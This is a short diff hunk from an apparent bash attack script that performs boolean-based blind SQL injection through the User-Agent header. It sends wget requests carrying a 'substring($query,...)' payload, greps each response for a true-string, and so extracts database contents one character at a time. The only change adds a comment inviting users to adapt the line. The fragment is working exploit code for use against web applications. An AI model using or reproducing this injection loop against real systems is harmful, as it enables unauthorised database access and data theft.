@@ -21,7 +21,7 @@ else
 		export nthchar=$j
 		for i in $charset
 		do
-			wget "-U $ua' and substring($query,$nthchar,1)='$i" -q -O - $url | grep "$truestring" &> /dev/null
+			wget "-U $ua' and substring($query,$nthchar,1)='$i" -q -O - $url | grep "$truestring" &> /dev/null # <-- Change as needed
 			if [ "$?" == "0" ]
 			then
 				printf "${grn} [+] Character number $nthchar found: $i\n"
